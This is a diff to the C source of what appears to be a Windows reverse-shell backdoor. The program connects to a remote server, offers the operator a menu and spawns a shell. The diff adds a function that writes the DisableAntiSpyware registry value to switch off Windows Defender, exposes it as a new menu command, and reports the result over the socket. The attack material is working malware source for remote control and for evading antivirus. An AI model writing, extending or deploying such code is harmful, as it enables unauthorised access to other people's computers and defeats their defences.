@@ -26,6 +26,8 @@
 int main(int argc, char* argv[]);
 SOCKET connectToServer();
 void startShellProcess(SOCKET* pSockfd, PROCESS_INFORMATION* pPinfo);
+void attemptDefeatDefender(SOCKET* pSockfd);
+void cleanManagerInput(char* command, size_t size);
 
 SOCKET connectToServer() {
 	SOCKET sockfd;
@@ -70,12 +72,7 @@ void startShellProcess(SOCKET* pSockfd, PROCESS_INFORMATION * pPinfo) {
 	recv(*pSockfd, shell, sizeof shell, 0);
 
 	// We need to clear the carriage return to call CreateProcessA
-	int i;
-	for (i = 0; i < (sizeof shell); ++i) {
-		if (shell[i] == '\r' || shell[i] == '\n') {
-			shell[i] = 0;
-		}
-	}
+	cleanManagerInput(shell, (size_t)sizeof shell);
 
 	STARTUPINFO sinfo;
 	memset(&sinfo, 0, sizeof sinfo);
@@ -93,6 +90,45 @@ void startShellProcess(SOCKET* pSockfd, PROCESS_INFORMATION * pPinfo) {
 	WaitForSingleObject(pPinfo->hProcess, INFINITE);
 }
 
+// Attempts to place the "DisableAntiSpyware" key in the registry, stopping Windows Defender. Runs under process security context.
+// Not sure how likely it is to have this running under admin without some serious maneuvering
+void attemptDefeatDefender(SOCKET* pSockfd) {
+	HKEY key;
+	DWORD one = 0x00000001;
+	char failed[] = "Failed to create new value.\n";
+	char success[] = "Succeeded in creating registry value!\n";
+
+	// Need to get a handle to the registry tree.
+	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_WRITE, &key) != ERROR_SUCCESS) {
+		send(*pSockfd, failed, sizeof failed, 0);
+		return;
+	}
+
+	// Create the value
+	if (RegSetValueExW(key, L"DisableAntiSpyware", 0, REG_DWORD, (LPBYTE)&one, sizeof(DWORD)) != ERROR_SUCCESS) {
+		send(*pSockfd, failed, sizeof failed, 0);
+		RegCloseKey(key);
+		return;
+	}
+
+	RegCloseKey(key);
+
+	send(*pSockfd, success, sizeof success, 0);
+	return;
+}
+
+// Cleaning up some stuff
+void cleanManagerInput(char* command, size_t size) {
+
+	int i;
+	for (i = 0; i < (size); ++i) {
+		if (command[i] == '\r' || command[i] == '\n') {
+			command[i] = 0;
+		}
+	}
+
+}
+
 int main(int argc, char* argv[]) {
 
 	WSADATA WsaData;
@@ -103,9 +139,11 @@ int main(int argc, char* argv[]) {
 
 	SOCKET sockfd;
 
-	char commandList[] = "1. Drop into a shell\n";
+	char commandList[] = 
+		"1. Drop into a shell\n"
+		"2. Attempt to stop defender\n";
+	
 	char commandOpt[50];
-
 	PROCESS_INFORMATION pinfo;
 
 	if ((sockfd = connectToServer()) == -1) {
@@ -119,8 +157,15 @@ int main(int argc, char* argv[]) {
 		send(sockfd, commandList, sizeof commandList, 0);
 		recv(sockfd, commandOpt, sizeof commandOpt, 0);
 
-		if (strcmp(commandOpt, "1\r\n") == 0) {
+		cleanManagerInput(commandOpt, (size_t)sizeof commandOpt);
+
+		if (strcmp(commandOpt, "1") == 0) {
 			startShellProcess(&sockfd, &pinfo);
+			continue;
+		}
+
+		if (strcmp(commandOpt, "2") == 0) {
+			attemptDefeatDefender(&sockfd);
 			continue;
 		}
 
